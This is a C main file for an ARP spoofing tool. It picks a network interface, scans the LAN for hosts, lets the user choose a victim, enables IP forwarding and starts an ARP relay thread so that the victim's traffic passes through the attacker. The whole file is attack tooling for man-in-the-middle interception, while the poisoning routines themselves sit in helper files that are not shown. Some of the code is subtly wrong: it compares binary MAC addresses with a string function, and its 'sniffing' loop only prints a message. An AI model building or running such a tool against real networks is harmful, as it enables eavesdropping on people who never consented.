#include "mainArpSpoofing.h"
#include "common_func.h"

int main() {
	pcap_t *handle;
	pcap_if_t *alldevs, *device;
	struct pcap_pkthdr *header;
	struct libnet_ethernet_hdr *eth_hdr;
	struct libnet_arp_hdr *arp_hdr;
	struct libnet_ipv4_hdr *ipv4_hdr;
	struct AdapterInfo adp_info;
	struct TargetInfo target_info;

	char errbuff[PCAP_ERRBUF_SIZE] = {0,};
	char ipbuff[32] = {0,};
	char ipbuff2[32] = {0,};
	char cmdbuff[10] = {0,};
	u_char target_ip[IP_ADDR_LEN] = {0,};
	u_char target_mac[ETHER_ADDR_LEN] = {0,};
		
	const u_char *pkt_data;

	int count = 0, sel_number = 0, res = 0, i = 0, exitflag = 0, target_count = 0;

	if(pcap_findalldevs(&alldevs, errbuff) > 0) {
		printf("pcap_findalldevs Error\n");
		return 1;
	}
	
	printf("-------------------------------------------------------Choose the your device-------------------------------------------------------\n");
	for(device = alldevs; device; device = device->next)
		printf("\t%d :  %s\n", ++count, (device->description)?(device->description):(device->name));
	if(count == 0) {
		printf("\nNo interfaces found! Make sure libpcap is installed.\n");
		return 1;
	}
	printf("------------------------------------------------------------------------------------------------------------------------------------\n");
	printf("Select Number (Exit - 0): ");
	scanf("%d", &sel_number);

	if(!(sel_number >= 0 && sel_number <= count)) {
		printf("\nInterface Number Out of Range.\n");
		return 1;
	} 

	if(sel_number == 0) return 0;

	for(device = alldevs, count = 0; device; device = device->next) if(sel_number == ++count) break;

	GetMyAdapter_info(device->name, adp_info.getMyIpAddress, adp_info.getMyMacAddress);
	printf("%s Ip Address : %s   %s Mac Address : ", device->name, inet_ntop(AF_INET, &adp_info.getMyIpAddress, ipbuff, sizeof(ipbuff)), device->name);
	for(i = 0; i < ETHER_ADDR_LEN; i++) {
		if(i == 5) printf("%02X\n", adp_info.getMyMacAddress[i]);
		else printf("%02X:", adp_info.getMyMacAddress[i]);
	}

	GetGateway_info(adp_info.getRouteIpAddress, adp_info.getRouteMacAddress);
	printf("Route Ip Address : %s   Route Mac Address : ", inet_ntop(AF_INET, &adp_info.getRouteIpAddress, ipbuff2, sizeof(ipbuff2)));
	for(i = 0; i < ETHER_ADDR_LEN; i++) {
		if(i == 5) printf("%02X\n", adp_info.getRouteMacAddress[i]);
		else printf("%02X:", adp_info.getRouteMacAddress[i]);
	}

	if(!(handle = pcap_open_live(device->name, 65536, 1, 1000, errbuff))) {
		printf("pcap_open_live Error %s\n", device->name);
		printf("Error : %s\n", errbuff);
		pcap_freealldevs(alldevs);
		return -1;
	}

	GetIpScan_Thread(adp_info.getMyIpAddress, adp_info.getMyMacAddress, adp_info.getRouteIpAddress, handle);

	printf("------------------------------------------------------------------------------------------------------------------------------------\n");
	while((res = pcap_next_ex(handle, &header, &pkt_data)) >= 0) {
		if(res == 0) continue;
		if(header->len != header->caplen) {
			printf("Pcap File Error\n");
			return 1;
		}

		eth_hdr = (struct libnet_ethernet_hdr *)pkt_data;
		switch (ntohs(eth_hdr->ether_type)) {
			case ETHERTYPE_ARP : 
				if(!strcasecmp(adp_info.getMyMacAddress, eth_hdr->ether_dhost)) {
					arp_hdr = (struct libnet_arp_hdr *)(pkt_data + sizeof(*eth_hdr));
					if(ARPOP_REPLY == ntohs(arp_hdr->ar_op))
						if(!strncmp(inet_ntop(AF_INET, &adp_info.getMyIpAddress, ipbuff, sizeof(ipbuff)), inet_ntop(AF_INET, &arp_hdr->ar_tpa, ipbuff2, sizeof(ipbuff2)), sizeof(ipbuff))) 
							TargetReplyScan(arp_hdr, &adp_info);
				}
				break;
		}
		exitflag = setPcapExitFlag();
		if(exitflag == EXIT_OK) {
			target_count = setTargetCount();
			goto out;
		}
	}
out:
	printf("-------------------------------------------------------Choose the your Target-------------------------------------------------------\n");
	while(1) {
		printf("Select Number (Exit - 0): ");
		scanf("%d", &sel_number);
		if(!(sel_number >= 0 && sel_number <= target_count)) printf("\nTarget Number Out of Range.\n");
		else if(sel_number == 0) return 0;
		else break;
	}
	setTargetNumber(sel_number, target_ip, target_mac);
	
	printf("Select Target Configuration Print Value Ip : %s Mac : ", inet_ntop(AF_INET, &target_ip, ipbuff, sizeof(ipbuff)));
	for(i = 0; i < ETHER_ADDR_LEN; i++) {
		if(i == 5) printf("%02X\n", target_mac[i]);
		else printf("%02X:", target_mac[i]);
	}
	
	popen_comm_func("if [ -f \"/proc/sys/net/ipv4/ip_forward\" ]; then echo 1 > /proc/sys/net/ipv4/ip_forward; echo success; else echo failed; fi;", cmdbuff, sizeof(cmdbuff));
	printf("Start Set IP Forwarding net.ipv4.ip_forward = 1 .......... Success\n");
	GetArpRelay_Thread(adp_info.getMyIpAddress, adp_info.getMyMacAddress, adp_info.getRouteIpAddress, adp_info.getRouteMacAddress, target_ip, target_mac, handle);
	printf("Start ARP Request and ARP Reply Relay .................... Success\n");
	
	while((res = pcap_next_ex(handle, &header, &pkt_data)) >= 0) {
		if(res == 0) continue;
		if(header->len != header->caplen) {
			printf("Pcap File Error\n");
			return 1;
		}
		printf("Start Target Sniffing ............ ARP Spoofing ..............\n");
	}
	
	pcap_freealldevs(alldevs);
	return 0;
}
